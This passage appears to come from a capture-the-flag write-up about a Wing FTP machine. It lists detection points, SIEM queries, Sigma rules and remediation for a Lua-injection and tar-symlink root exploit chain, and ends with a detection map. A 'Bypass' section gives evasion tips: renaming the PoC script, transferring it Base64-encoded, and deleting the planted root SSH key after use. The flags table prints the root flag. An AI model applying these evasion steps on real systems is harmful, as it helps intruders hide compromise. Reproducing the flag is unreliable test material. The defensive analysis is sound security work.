1. Linux EDR detects the tar process writing to `/root/.ssh/authorized_keys`: a path outside the expected extraction directory and one with high sensitivity for FIM rules.
2. Root-owned `nc` process with a listening socket is a bind shell indicator: process tree: `tar extraction script -> nc` is anomalous.
3. `python3 CVE-2025-4517-POC.py` execution in the backup directory by `wacky`: the presence of a PoC Python script with a CVE number in its filename is an unambiguous indicator if process arguments are logged.

**SIEM Correlation:**
```
index=os sourcetype=linux_audit type=PATH name="/root/.ssh/authorized_keys" | where nametype="CREATE" OR nametype="NORMAL" | stats count by pid, ppid, uid
```
Write to root's authorized_keys file by any process.

```
index=network sourcetype=firewall_logs dest_port=1337 direction=inbound | stats count by src_ip, dest_ip
```

**Sigma Rule:**
1. [lnx_ssh_authorized_keys_modification.yml](https://github.com/SigmaHQ/sigma/search?q=authorized_keys): detects creation or modification of SSH authorized_keys files, particularly by processes other than the owning user's interactive session.
2. [lnx_priv_esc_tar_wildcard.yml](https://github.com/SigmaHQ/sigma/search?q=tar+privilege+escalation): detects tar execution patterns associated with symlink or wildcard privilege escalation techniques.

**Bypass:**
1. The PoC Python script filename (`CVE-2025-4517-POC.py`) is an immediate indicator: rename to something operationally neutral (`backup_helper.py`, `compress_util.py`) before execution to remove the CVE string from process argument logs.
2. Download the PoC via the existing shell session (Base64-encode on attacker machine, decode on target) rather than running a Python HTTP server: eliminates the `wget` process and the inbound HTTP server connection as artifacts.
3. The write to `/root/.ssh/authorized_keys` is unavoidable as the mechanism of the exploit: the only way to reduce its detectability is speed: execute the exploit, establish the SSH session, and remove the injected key entry from authorized_keys immediately after confirming access. The key entry removed after use leaves a narrower forensic window for FIM detection.
4. Currently I do not have a verified approach to avoid the authorized_keys write entirely while achieving root via this CVE: the write is intrinsic to the technique.

**Remediation:**
1. The root-owned extraction process must not operate against directories writable by unprivileged users: restrict the backup directory to root ownership with mode 755 or create it with a dedicated backup service account.
2. Use `--no-overwrite-dir` and `--no-same-owner` tar flags and validate archive contents before extraction in any automated root process.
3. Deploy file integrity monitoring (Wazuh FIM) on `/root/.ssh/`: any write to authorized_keys by a non-interactive root process should trigger an immediate alert.
4. Update to a patched version addressing CVE-2025-4517.

**OpSec Rating:** Loud: writing to `/root/.ssh/authorized_keys` via a path traversal exploit and establishing a bind shell as root generates file integrity, process, and network artifacts detectable at multiple layers in a hardened environment.

---

## Flags

| | |
|---|---|
| User | `cat /home/wacky/user.txt` |
| Root | `087942b6666f37356e9eae0c6a04e339` |

---

## Detection Map

| Step | MITRE | Log Source | Sigma Rule | OpSec |
|---|---|---|---|---|
| Port scan | T1046 | Network / firewall | proc_creation_lnx_susp_nmap.yml | Loud |
| Subdomain enumeration | T1595.003 | /var/log/apache2/access.log | web_scan_generic_product.yml | Moderate |
| Wing FTP anonymous login | T1078.001 | Wing FTP access log |: | Silent |
| ICMP OOB verification | T1018 | Network / firewall | lnx_network_connection_from_service.yml | Loud |
| CVE-2025-47812 Lua injection | T1190 | Wing FTP access log, network, EDR | proc_creation_lnx_reverse_shell.yml | Loud |
| Config file enumeration | T1552.001 | auditd / EDR | file_access_lnx_sensitive_files.yml | Silent |
| Hash cracking | T1110.002 | Attacker host only | proc_creation_lnx_password_cracker.yml | Silent |
| SSH lateral movement | T1021.004 / T1078 | /var/log/auth.log | lnx_auth_successful_ssh_login_from_new_source.yml | Moderate |
| Sudo enumeration | T1069 | /var/log/auth.log | lnx_sudo_privilege_enumeration.yml | Silent |
| CVE-2025-4517 tar symlink LPE | T1548.003 | auditd, FIM, network | lnx_ssh_authorized_keys_modification.yml | Loud |

---

## Would I Get Caught

**Assumed environment:** Default Debian installation running Apache, Wing FTP Server v7.4.3, and standard system utilities. No WAF, no EDR agent, no auditd rules beyond defaults, no SIEM. Standard syslog, Apache access logging, Wing FTP access logging, and auth.log only.

**Verdict:** No. The complete chain from reconnaissance to root executes without a single real-time alert. Wing FTP access logs contain the full injected Lua payload verbatim, auth.log records every SSH authentication event, and the ICMP probe is visible in any network capture, but none of it is monitored in a default configuration.

**The single control that breaks the entire chain:** Patching Wing FTP to a version that sanitises the username field before writing to session files. Without CVE-2025-47812, there is no code execution path available via anonymous authentication. The anonymous login feature alone is not exploitable without the injection vulnerability: disabling anonymous access would be a secondary control that raises the barrier but does not address the root cause.

**Where a tuned environment catches this operation:**

The ICMP probe from the Wing FTP process to an external IP is the earliest high-confidence detection point: a server application initiating outbound ICMP to an attacker-controlled host is anomalous and would alert in any environment with egress monitoring. If that is missed, the write to `/root/.ssh/authorized_keys` by the tar extraction process is the next detection point: file integrity monitoring on that specific path is a standard hardening baseline and would generate an immediate high-severity alert, likely before the SSH connection as root is established.

**What remains undetectable regardless of environment:**

Subdomain enumeration generates access log entries but no meaningful anomaly signal without content-analysis tooling. Wing FTP configuration file reads by the Wing FTP service account generate no alert under any default configuration: the service account reading its own application files is expected behaviour. SHA-256 hash cracking is entirely offline. `sudo -l` generates one low-severity auth.log entry that no default rule monitors independently. The quiet phases of this operation are the enumeration and credential recovery steps: the noise is at the injection and privilege escalation stages, exactly where the most impactful detection controls should be focused.
